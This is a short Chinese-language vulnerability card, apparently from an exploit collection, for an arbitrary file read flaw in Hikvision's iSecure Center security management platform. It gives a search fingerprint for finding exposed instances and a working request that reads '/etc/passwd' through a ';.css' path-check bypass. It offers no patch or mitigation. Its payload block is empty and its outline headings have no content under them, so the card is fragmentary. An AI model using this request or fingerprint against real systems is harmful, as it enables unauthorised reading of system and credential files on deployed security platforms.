# 海康威视iSecureCenter综合安防管理平台files接口存在任意文件读取漏洞

- **系统**：海康　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

```

**其他**
- 海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * HIKVISION iSecure Center综合安防管理平台